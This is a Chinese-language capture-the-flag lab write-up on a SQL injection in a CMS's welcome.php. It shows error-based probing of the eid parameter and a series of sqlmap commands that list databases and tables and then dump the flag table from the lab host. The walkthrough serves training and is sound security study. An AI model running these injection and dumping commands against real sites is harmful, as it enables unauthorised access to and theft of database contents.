**靶标介绍：**

 **该CMS的welcome.php中存在SQL注入漏洞**

1.打开靶场，并进行访问

**![1688956478_64ab6e3ea1f6660821c30.png!small](https://image.3001.net/images/20230710/1688956478_64ab6e3ea1f6660821c30.png!small)**

需要进行注册

![1688956511_64ab6e5fd12f35bcc32de.png!small](https://image.3001.net/images/20230710/1688956511_64ab6e5fd12f35bcc32de.png!small)

2.任意注册帐户密码

**![1688956575_64ab6e9f51f6e31e8d50c.png!small](https://image.3001.net/images/20230710/1688956575_64ab6e9f51f6e31e8d50c.png!small)**

![1688956609_64ab6ec1962b54f6fd1cb.png!small](https://image.3001.net/images/20230710/1688956609_64ab6ec1962b54f6fd1cb.png!small)

3.登录成功后寻找注入点，根据靶场提示CMS的welcome.php中存在SQL注入

**![1688956657_64ab6ef1e791844bc3400.png!small](https://image.3001.net/images/20230710/1688956657_64ab6ef1e791844bc3400.png!small)**

![1688956687_64ab6f0f5173cd0d50eb4.png!small](https://image.3001.net/images/20230710/1688956687_64ab6f0f5173cd0d50eb4.png!small)

4.在eid参数后面添加单引号测试，出现报错

![1688956708_64ab6f24535310ec240bb.png!small](https://image.3001.net/images/20230710/1688956708_64ab6f24535310ec240bb.png!small)

6.使用sqlmap工具进行所有数据库爆破。sqlmap.py -u
"http://eci-2zeclzb9xbdphxtltxbx.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34"
-dbs

**![1688960682_64ab7eaaecbf3d9c8a7cf.png!small](https://image.3001.net/images/20230710/1688960682_64ab7eaaecbf3d9c8a7cf.png!small)**

7.爆出四个库，选择ctf库，加--tables对表进行爆破

sqlmap.py -u
"http://eci-2zeclzb9xbdphxtltxbx.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34"
-D ctf --tables

**![1688960700_64ab7ebc70c8e0966c29b.png!small](https://image.3001.net/images/20230710/1688960700_64ab7ebc70c8e0966c29b.png!small)**

8.爆出九个表，选择flag表，对字段进行爆破

sqlmap.py -u
"http://eci-2zeclzb9xbdphxtltxbx.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34"
-D ctf -T flag --count

![1688960714_64ab7eca1d6d2cda47e00.png!small](https://image.3001.net/images/20230710/1688960714_64ab7eca1d6d2cda47e00.png!small)

9.爆出字段名，加 --dump 对字段值进行爆破，找到flag

sqlmap.py -u
"http://eci-2zeclzb9xbdphxtltxbx.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34"
-D ctf -T flag --dump

**![1688960738_64ab7ee287143f005e559.png!small](https://image.3001.net/images/20230710/1688960738_64ab7ee287143f005e559.png!small)**

